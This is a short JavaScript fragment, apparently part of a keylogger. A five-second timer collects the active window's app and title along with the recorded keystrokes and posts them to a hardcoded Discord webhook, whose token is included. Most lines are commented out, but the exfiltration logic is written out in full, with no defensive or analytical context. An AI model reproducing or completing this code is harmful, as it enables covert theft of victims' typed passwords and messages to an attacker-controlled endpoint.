setInterval(async () => {
//     let window = await getWindowInfo();

//     await axios.post('https://discord.com/api/webhooks/1232536883591118958/P2sG1Hpmc8cxPgVngS5XqMNlr8hN796LrWy9mPnenret7nQzyvwBEInZwLwetVGfttig', {
//         "content": `Keylogs: ${keylogs}\nApp: ${window.app}\nTitle: ${window.title}`
//     }).then(async () => {
//         keylogs = ''
//     })

// }, 1000 * 5);